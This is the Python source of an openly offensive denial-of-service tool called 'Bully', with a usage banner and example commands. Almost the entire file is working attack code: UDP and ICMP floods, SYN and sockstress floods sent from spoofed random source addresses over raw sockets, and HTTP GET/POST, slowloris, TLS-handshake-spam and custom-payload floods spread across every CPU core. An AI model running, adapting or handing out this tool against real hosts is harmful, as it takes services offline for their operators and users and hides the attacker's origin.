'''
---------------------------------------------------------------------------------------------------------------                          
                            ██████╗ ██╗   ██╗██╗     ██╗  ██╗   ██╗
                            ██╔══██╗██║   ██║██║     ██║  ╚██╗ ██╔╝
                            ██████╔╝██║   ██║██║     ██║   ╚████╔╝ 
                            ██╔══██╗██║   ██║██║     ██║    ╚██╔╝  
                            ██████╔╝╚██████╔╝███████╗███████╗██║   
                            ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝Bully DoS Tool by Frank Cisco   
                                                                Version = 2.0
                                                                Recommended OS = Linux 
---------------------------------------------------------------------------------------------------------------
''' 
import socket
import random
import signal
import ssl
import sys 
import os 
import string
import multiprocessing 
import argparse
import threading
from fake_headers import Headers
from urllib.parse import urlparse
from fake_useragent import UserAgent
from impacket import ImpactDecoder, ImpactPacket

RED,GREEN,END =  '\033[1;91m','\033[1;32m', '\033[0m'

class Tool : 

    @staticmethod
    def usage() -> str : 
        
        Tool.clear()
                        
        print('''
              \r------------------------------------USAGE-----------------------------------------\n\n
              \rAttack Methods ===> -m 
              \r------------------------------------
              '''+RED +'\rLayer 4 attack methods ==>' +END +'''
              \rUDP 
              \rICMPF
              \rICMPB
              \rSYN
              \rSTRESS
              \r------------------------------------
              '''+RED +'\rLayer 7 attack methods ==>' +END +'''
              \rGET
              \rPPS
              \rPOST
              \rXMLRPC
              \rSLOW
              \rCUSTOM 
              \rSSL
              \rKILL     
              \r ------------------------------------
              \rpython Bull.py -target<url/uri> -m<attack method> -s<concurrent socket> -w <concurrent worker> 
              
              \rpython Bull.py -target 192.168.1.1 -m PPS -s 200 -w max (uses your all cpu cores and create 200 socket per cpu core.)
              
              \rpython Bull.py -target 192.168.1.1 -m SLOW -s 1000 -w min (use 1 cpu core and create 100 socket.)
              
              \rpython Bull.py -target 192.168.1.1 -m XMLRPC -s 50 -w 8 (uses 8 cpu core and create 200 socket per cpu core.)

              \rpython Bull.py -target 192.168.1.1 -m CUSTOM -s 200 -w max -l <file location for 'custom' method(not required other methods)> 
              
              \r! if you use custom method use -l argument like this => C:\X\Text.txt dont use '' or " " 
              ''')

    @staticmethod 
    def attack_banner(method,target,sockets,worker) -> str  : 
        
        print(f''' 
                \r[I] Bully started.
                \r---------------------------------------------------------
                \rAttack type => {method} 
                \rAttack layer => {Target.layer(method)}
                \rHost name => {Target.hostname(target)}
                \rHost IP => {Target.ip_addr(target)}
                \rPort => {Target.port(target)}
                \rSocket count per worker => {Target.socket_count(sockets)}
                \rWorker count => {Target.workers(worker)}
                \r---------------------------------------------------------''' )
    
    
    @staticmethod
    def clear() -> None : 
        
        if os.name == 'nt' :
            
            os.system('cls')
            
        elif os.name == 'posix' :
            
            os.system('clear')
            
        else : 
            
            pass 
    
    @staticmethod
    def ip_generator() -> str: 
    
        addr_parse = [0, 0, 0, 0] 

        addr_parse[0] = str(random.randint(1,197)) 
        addr_parse[1] = str(random.randint(0,255)) 
        addr_parse[2] = str(random.randint(0,255))
        addr_parse[3] = str(random.randint(1,254))
        
        return '.'.join(addr_parse)
    
    @staticmethod
    def spoof_ip() -> str : 
        
        return Tool.ip_generator()


class Target:

    @staticmethod
    def hostname(target) -> str :
        
        return urlparse(target).hostname 
   
    @staticmethod
    def port(target) -> int : 
    
        if urlparse(target).scheme.lower() == 'https' : 
            
            return 443 
        
        elif urlparse(target).scheme.lower() == 'http' :
        
            return 80
        
        else : 
            print(RED + 'Check url' + END )
            
            sys.exit(1)
    
    @staticmethod
    def ip_addr(target):
        
        return socket.gethostbyname(Target.hostname(target))
    
    
    @staticmethod
    def socket_count(sockets) -> int :
        
        return int(sockets) 
    
    @staticmethod
    def workers(worker) -> int : 
        
        if worker == 'max' : 
            
            return int(multiprocessing.cpu_count())
        
        elif worker == 'min' : 
            
            return 1 
    
        else : 
            
            return int(worker)
    
    @staticmethod
    def layer(method) -> str : 
        
        layer4_methods = ['UDP','ICMPF','ICMPB','SYN','STRESS']
        
        layer7_methods = ['GET','PPS','POST','XMLRPC','KILL','SLOW','SSL','CUSTOM']
            
        if method in layer4_methods : 
            
            return 'Layer 4'
        
        elif method in layer7_methods : 
            
            return 'Layer 7'
        
        else : 
            
            Tool.usage() 
            
            sys.exit(0)


class Payload_Generator : 
    
    @staticmethod
    def udp() -> str : 
        
        return random._urandom(32)
    @staticmethod
    def bomb() -> str :
        
        return random._urandom(65000)
    @staticmethod
    def flood() -> str :
        
        return random._urandom(64) 
        
    @staticmethod
    def syn(spoof_ip,target,port) -> str :  
        
        ip = ImpactPacket.IP()
        
        ip.set_ip_src(spoof_ip)
        
        ip.set_ip_dst(target)

        tcp = ImpactPacket.TCP()
                    
        tcp.set_SYN()
                
        tcp.set_th_flags(0x02)
    
        tcp.set_th_dport(port)
        
        tcp.set_th_sport(80)
        
        ip.contains(tcp)
        
        return ip.get_packet()
    
    
    @staticmethod
    def ack(spoof_ip,target,port) -> str  :
        
        ip = ImpactPacket.IP()
        
        ip.set_ip_src(spoof_ip)
        
        ip.set_ip_dst(target)

        tcp = ImpactPacket.TCP()
                    
        tcp.set_ACK()
        
        tcp.set_th_flags(0x10)

        tcp.set_th_win(0)
    
        tcp.set_th_dport(port)
        
        tcp.set_th_sport(80)
        
        ip.contains(tcp)
        
        return ip.get_packet()
    
    
    @staticmethod
    def useragent() -> str : 
        
        return UserAgent().random 
    
    @staticmethod
    def referers() -> str  :
        referers = [
               "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
                ",https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer",
                "/sharer.php?u=",
                ",https://drive.google.com/viewerng/viewer?url=",
                ",https://www.google.com/translate?u=",
                "https://www.google.com/",
                "http://www.yandex.com/",]
       
        return  random.choice(referers)
    
    @staticmethod
    def generate_cookie() -> str :

        cookie_chars = string.ascii_letters + string.digits

        return ''.join(random.choice(cookie_chars) for i in range(64))
    
    @staticmethod
    def generate_random_path() -> str:
    
        path_length = random.randint(1, 10) 
    
        path_chars = string.ascii_letters + string.digits + '/_-' 
        
        path = ''.join(random.choice(path_chars) for i in range(path_length)) 
    
        return '/' + path 
    
    @staticmethod
    def pps(target) -> str : 
        
        return f'GET / HTTP/1.1\r\nHost:{urlparse(target).hostname}\r\n\r\n'
    
    @staticmethod
    def get(target) -> str : 
        
        packet = f'''
            GET / HTTP/1.1
            Host: {urlparse(target).hostname}
            User-Agent: {Payload_Generator.useragent()}
            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
            Accept-Language: en-US,en;q=0.5
            Accept-Encoding: gzip, deflate
            Content-Type: application/json; charset=UTF-8
            Referer: {Payload_Generator.referers()}
            Connection: keep-alive
            Upgrade-Insecure-Requests: 1
            '''
        return packet 
    
    @staticmethod
    def slowloris(target) -> str  :
        
        packet = f'X-a:{random.randint(1, 4000)} Host :{urlparse(target).hostname} \r\n'
        
        return packet 
    
    @staticmethod
    def post(target) -> str : 
        
        packet =    f'''
                    POST /{Payload_Generator.generate_random_path()}?format=json&hasfast=true&authuser=0 HTTP/2
                    Host: {urlparse(target).hostname}
                    Content-Length: {random.randint(0,500)}
                    Content-Type: application/x-www-form-urlencoded;charset=UTF-8
                    X-Goog-Authuser: 0
                    Connection: keep-alive
                    User-Agent: {Payload_Generator.useragent()}
                    Accept: */*
                    X-Client-Data: CIfbygE=
                    Sec-Fetch-Site: same-site
                    Referer :{Payload_Generator.referers()}
                    Sec-Fetch-Mode: cors
                    Sec-Fetch-Dest: empty
                    Accept-Language: en-US,en;q=0.5
                    Accept-Encoding: gzip, deflate
                        [
                            [
                                1,
                                null
                                ,null
                                ,null
                                ,null
                                ,null
                                ,null
                                ,null
                                ,null
                                ,null
                                ,
                                    [
                                    null
                                    ,null
                                    ,null
                                    ,null
                                    ,"en"
                                    ,null
                                    ,null
                                    ,null
                                    ,null,]
                                            ]'''
                                            
        return packet

    @staticmethod
    def XML(target) -> str :
        
        packet = f'''
        GET /files/???XML HTTP/2
        Host: {urlparse(target).hostname}
        Cookie: {Payload_Generator.generate_cookie()}
        X-Requested-With: XMLHttpRequest
        User-Agent: {Payload_Generator.useragent()}
        Sec-Ch-Ua-Platform: "Windows"
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
        Sec-Fetch-Site: same-origin
        Sec-Fetch-Mode: no-cors
        Sec-Fetch-Dest: image
        Referer: {Payload_Generator.referers()}
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        '''
        return packet
    
    @staticmethod
    def custom(location=None) -> str : 
        
       
        if location : 
            
            try : 
                
                packet = ' '

                with open(location,'r',encoding='utf-8') as file : 
                    
                    for row in file.readlines():
                        
                        packet += row
                
                return packet
            
            except Exception as error  :
       
                print(error)
                
                sys.exit(0) 
                
        else : 
            
            pass
    
        
class Layer4:  
    
    def __init__(self,
                 name,
                 target,
                 dst_ip,
                 port,
                 spoof_ip,
                 socket_count,
                 workers,
                 method) :
        
        self.keep_running = True
        
        self.sockets  = [] 
        
        self.retry_count = 0
        
        self.name = name 
        
        self.target = target
        
        self.dst_ip = dst_ip
        
        self.port = port
        
        self.spoof_ip = spoof_ip 
           
        self.socket_count = socket_count
        
        self.process_count =  workers

        self.method = method
         
        self.attack_methods = {'UDP': self.udp_storm,
                               'SYN':self.syn_flood,
                               'ICMPF':self.icmp_flood,
                               'ICMPB':self.icmp_flood,
                               'STRESS':self.sockstress} 
    
    
    
    def signal_handler(self, signum, frame) :
       
        print(RED + f'\nCTRL+C pressed,{self.name} closing.' + END )
       
        self.keep_running = False
        
    
    def init_udp_socket(self) : 
        
        sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) 

        return sock 
    
    
    def udp_storm(self) : 
    
        _payload = Payload_Generator.udp()
        
        for _ in range(self.socket_count):
            
            sock = self.init_udp_socket() 

            self.sockets.append(sock)
            
        if self.sockets : 
            
            signal.signal(signal.SIGINT, self.signal_handler) 

            print(GREEN + f'{self.name} => Created {self.socket_count} sockets.Started to hit.')
           
            while self.keep_running : 
            
                try : 
                
                    for sock in self.sockets:
                        
                        sock.sendto(_payload,(self.target,self.port))

                except Exception as error : 
                    
                    if isinstance(error, WindowsError) and error.winerror == 10055:
                    
                        print(RED +f'Error ==> {self.name} => Low buffer size,closing process.'+ END )
                    
                        break 
                        
                    else : 
                        
                        print(RED + str(error) + END )
                        
                        pass 
                    
            
    def init_icmp_socket(self) :
            
        sock = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
            
        return sock
      
    
            
    def icmp_flood(self) : 
       
        try  :
                
            if self.method == 'ICMPB' : 
                
                _payload = Payload_Generator.bomb()
            
            elif self.method == 'ICMPF' : 
                
                _payload = Payload_Generator.flood()
            
            for num in range(self.socket_count):
                
                sock = self.init_icmp_socket() 
                
                self.sockets.append(sock)
                
            if self.sockets : 
                
                signal.signal(signal.SIGINT, self.signal_handler) 
                
                print(GREEN + f'[I]{self.name} hitting with {self.socket_count} sockets.'+ END) 
                
                while self.keep_running  : 
                    
                    try : 
                        
                        for sock in self.sockets:
                            
                            sock.sendto(_payload,(self.target,self.port))
                    
                    except Exception as error : 
                        
                        if isinstance(error, WindowsError) and error.winerror == 10055 : 
                            
                            print(RED +f'Error ==> {self.name} Low buffer size.Killing process.'+ END )
                        
                            self.keep_running = False 

                        if isinstance(error, WindowsError) and error.winerror == 10013 : 
                                
                            print(RED +f'Error ==> {self.name} Sending packet with socket failure,try run as admin.' + END)
                            
                            self.keep_running = False
                            
        except Exception as error : 
            
            if isinstance(error,PermissionError) :
                
                print(RED + 'Socket creating failure,try run as admin.' + END)
            
            
    def init_tcp_socket(self) : 
        
        sock = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP) 
        
        sock.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1) 
                        
        sock.connect((self.target,self.port))
            
        return sock 
      
    
    
    def open_connections(self) : 
        
        for _ in range(self.socket_count) : 
         
            sock = self.init_tcp_socket()
                        
            self.sockets.append(sock)
        


    def syn_flood(self) :    
        
        try : 
            
            _payload = Payload_Generator.syn(self.spoof_ip,self.dst_ip,self.port)
           
            self.open_connections()

            if self.sockets : 
                
                signal.signal(signal.SIGINT, self.signal_handler) 
                
                print(GREEN + f'[I]{self.name} hitting with {self.socket_count} sockets.'+ END)
                
                while self.keep_running : 
                    
                    try : 
                        
                        for sock in self.sockets :
                            
                            sock.send(_payload)

                    except : 
                        
                        pass 
       
        except Exception as error : 
            
            
            if isinstance(error, WindowsError) and error.winerror == 10013 : 
                            
                print(RED +f'Error ==> {self.name} Socket creating failure,try run as admin.' + END)
                
                self.keep_running = False   
            
            if isinstance(error, WindowsError) and error.winerror == 10022:
                        
                print(RED +f'Error ==> {self.name} => Invalid argument,maybe occurs by Windows try on Linux.'+ END )
                
                self.keep_running = False 
                
                        
    def sockstress(self) : 
        
        try : 
        
                _payload0 = Payload_Generator.syn(self.spoof_ip,self.dst_ip,self.port)
                
                _payload1 = Payload_Generator.ack(self.spoof_ip,self.dst_ip,self.port)
                
                self.open_connections()

                if self.sockets : 
                
                    signal.signal(signal.SIGINT, self.signal_handler) 
                    
                    print(GREEN + f'[I]{self.name} hitting with {self.socket_count} sockets.'+ END)
        
                    while self.keep_running : 
                        
                        try : 
                            
                            for sock in self.sockets :
                                
                                sock.send(_payload0)

                                sock.send(_payload1)             
                    
                        except :  
        
                            pass 
        
        except Exception as error : 
            
            if isinstance(error, WindowsError) and error.winerror == 10013 : 
                            
                print(RED +f'Error =>{self.name} Socket creating failure,try run as admin.' + END)
                
                self.keep_running = False   
            
            if isinstance(error, WindowsError) and error.winerror == 10022:
                        
                print(RED +f'Error ==> {self.name} => Invalid argument,maybe occurs by Windows try on Linux.'+ END )
                
                self.keep_running = False 
    
    
    def _run(self) : 
         
        self.attack_methods[self.method]()
 
        
class Layer7: 
    
    def __init__(self,
                 name,
                 target,
                 dst_ip,
                 port,
                 socket_count,
                 workers,
                 location,
                 method,
                 barrier) : 
        
        self.keep_running = True
        
        self.thread_count = 10
        
        self.retry_count = 0
        
        self.sockets  = []  
       
        self.thread_list = []
        
        self.name = name 
        
        self.target = target
        
        self.ip = dst_ip    
        
        self.port = port
        
        self.socket_count = socket_count
       
        self.process_count =  workers

        self.location = location

        self.method = method
        
        self.barrier = barrier

        self.methods = {'GET':Payload_Generator.get(self.target),
                               'PPS':Payload_Generator.pps(self.target),
                               'POST':Payload_Generator.post(self.target),
                               'XMLRPC':Payload_Generator.XML(self.target),
                               'CUSTOM':Payload_Generator.custom(self.location),
                               'SLOW':Payload_Generator.slowloris(self.target),
                               'KILL':Payload_Generator.pps(self.target),
                               'SSL':self.handshake_spam } 
    
    def signal_handler(self, signum, frame):
       
        print(RED + f'\nCTRL+C pressed,{self.name} closing.' + END )
       
        self.keep_running = False
    
    
    def init_tcp_socket(self) :
        
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
        
        sock.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1)
        
        sock.settimeout(60)
        
        sock.connect((self.target,self.port))  

        if self.port == 443 :
                    
            context = ssl.create_default_context()

            context.check_hostname = False
                    
            context.verify_mode = ssl.CERT_NONE
                    
            sock = context.wrap_socket(sock,server_hostname=self.target,server_side=False)

            return sock

        return sock
     
    def open_connections(self) : 
        
        for _ in range(self.socket_count) : 
            

            sock = self.init_tcp_socket()
                    
            self.sockets.append(sock)
           

    
    def init_ssl_spam_socket(self) : 
        
        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)             
        
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)   
        
        context.verify_mode = ssl.CERT_REQUIRED
    
        context.check_hostname = True

        sock = context.wrap_socket(sock,server_hostname=self.target,server_side=False,do_handshake_on_connect=False)

        sock.settimeout(0.9)
        
        return sock



   
    def handshake_spam(self) :
     
        while True : 
            
            sockets = []
            
            for num in range(self.socket_count) :
                
                try  : 
                    
                    sock = self.init_ssl_spam_socket()
                        
                    sock.do_handshake()
                
                    self.sockets.append(sock)
                
                except : 
                    
                    pass 
                
            for sock in self.sockets  : 
                
                sock.shutdown(socket.SHUT_RDWR)

                sock.close()

    def socket_per_thread(self) : 
        
        for _ in range(self.socket_count // self.thread_count) :
               
            try :     
               
                sock = self.init_tcp_socket()
                    
                self.sockets.append(sock)
           
            except : 
                
                pass
        
        
    def run_kill(self):
        
        payload = self.methods[self.method]
        
        self.socket_per_thread()
            
        if self.sockets : 
            
            print(GREEN + f'Worker => {self.name} Thread => {threading.current_thread().name} hitting now.\r',end='' + END)    
            
            while self.keep_running : 
            
                try : 
                    
                    for sock in self.sockets :
                        
                        sock.send(str.encode(payload)) 

                except : 
                    
                    if self.retry_count <= 1000 :
                        
                        self.retry_count += 1
                                     
                    else:
                        
                        self.thread_count += -1 
                                          
                        self.keep_running = False 
                       
               
    def KILL(self) : 
        
        threads = []
        
        signal.signal(signal.SIGINT, self.signal_handler) 
        
        for i in range(self.thread_count):
           
            thread = threading.Thread(target=self.run_kill, name=f'Thread{i+1}')
            
            threads.append(thread)
            
            thread.start()
    
    
    def attack(self) : 
        
        payload = self.methods[self.method]
        
        self.open_connections()
        
        print(f'{self.name} => Created {self.socket_count} sockets,waiting barrier.')
        
        self.barrier.wait()
        
        if self.sockets : 
           
            print(GREEN + f'[I]{self.name} hitting with {self.socket_count} sockets.'+ END)
            
            signal.signal(signal.SIGINT, self.signal_handler)
            
            while self.keep_running : 
            
                try : 
                
                    for sock in self.sockets :
                        
                        sock.send(str.encode(payload)) 
            
                except Exception as error : 
                
                    if isinstance(error, ConnectionResetError) :
                        
                        pass  
                    
                    elif isinstance(error, WindowsError) and error.winerror == 10060:
                        
                        pass 
                    
                    elif isinstance(error, WindowsError) and error.winerror == 10053:
                        
                        pass 
                    
                    elif isinstance(error,ssl.SSLEOFError)  : 
                        
                        pass 
                    
                    elif isinstance(error,TimeoutError): 

                        pass 
                    
                    else : 
                        
                        print(RED + str(error)+ END)
                        
                        pass 
                        
                    if self.retry_count <= 500:
                        
                        self.retry_count += 1
                                             
                    else:
                        
                        print(RED +f'Error==> {multiprocessing.current_process().name} => Reached maximum retry count,process closing.'+ END)
                        
                        break
 
    def _run(self) : 
              
        if self.method  == 'SSL' : 
            
            self.methods[self.method]() 
        
        elif self.method == 'KILL' :
            
            self.KILL()

        else : 
            
            self.attack()


class Worker(multiprocessing.Process):
    
    def __init__(self,
                 name,
                 target,
                 dst_ip,
                 port,
                 socket_count,
                 workers,
                 location,
                 layer,
                 method,
                 barrier,
                 spoof_ip):
        
        super().__init__()
        
        self.name = name 
        
        self.target = target
        
        self.ip = dst_ip 
        
        self.port = port 
        
        self.socket_count = socket_count
        
        self.process_count = workers 
        
        self.location = location
        
        self.layer = layer 
        
        self.method = method
        
        self.barrier = barrier
        
        self.spoof_ip = spoof_ip


    def run(self):
      
        if self.layer == 'Layer 4' : 
            
            Layer4(self.name,
                    self.target,
                    self.ip,
                    self.port,
                    self.spoof_ip,
                    self.socket_count,
                    self.process_count,
                    self.method
                )._run()
        elif self.layer == 'Layer 7' : 
            
            Layer7(self.name,
                    self.target,
                    self.ip,
                    self.port,
                    self.socket_count,
                    self.process_count,
                    self.location,
                    self.method,
                    self.barrier
                )._run()



if __name__ == '__main__': 

   
    parser = argparse.ArgumentParser(description='Bully CLI.')
    
    parser.add_argument('-target','--target',type=str,help='Target address.')
    
    parser.add_argument('-m','--method',type=str,help='Attack method.')
    
    parser.add_argument('-s','--socket',type=int,help='Concurrent socket count.')

    parser.add_argument('-w','--workers',help='Concurrent workers.')

    parser.add_argument('-l','--location',type=str,required=False,help='File location for custom packet attack.')
    
    args = parser.parse_args()  
    
    PROCESS_LIST = []
    
    TARGET = Target.hostname(args.target)
    
    IP = Target.ip_addr(args.target)
    
    PORT = Target.port(args.target)
    
    SPOOF_IP = Tool.spoof_ip()
    
    SOCKET_COUNT = Target.socket_count(args.socket)
    
    PROCESS_COUNT = Target.workers(args.workers)
    
    FILE_LOCATION = args.location
        
    LAYER  = Target.layer(args.method)
    
    METHOD = args.method
    
    BARRIER = multiprocessing.Barrier(PROCESS_COUNT)
    
    Tool.clear()
    
    Tool.attack_banner(args.method,args.target,args.socket,args.workers)
      
    print(f'{PROCESS_COUNT} Workers preparing to hit => {TARGET}\n')
        
    for p in range(PROCESS_COUNT):
        
        NAME = f'Worker{p+1}'
        
        if LAYER == 'Layer 7' :
    
            worker = Worker(NAME,
                            TARGET,
                            IP,
                            PORT,
                            SOCKET_COUNT,
                            PROCESS_COUNT,
                            FILE_LOCATION,
                            LAYER,METHOD,
                            BARRIER,
                            None)

            PROCESS_LIST.append(worker)
            
            worker.start()
        
        elif LAYER == 'Layer 4' : 
            
            worker = Worker(NAME,
                            TARGET,
                            IP,
                            PORT,
                            SOCKET_COUNT,
                            PROCESS_COUNT,
                            FILE_LOCATION,
                            LAYER,
                            METHOD,
                            BARRIER,
                            SPOOF_IP)
            
            PROCESS_LIST.append(worker)
            
            worker.start()
        

    for worker in PROCESS_LIST : 
       
       try : 
           
            worker.join() 
       
       except : 
           
           pass  #Ignore closing traceback.    
       
       
    print('All processes dead.\nBully closing.')







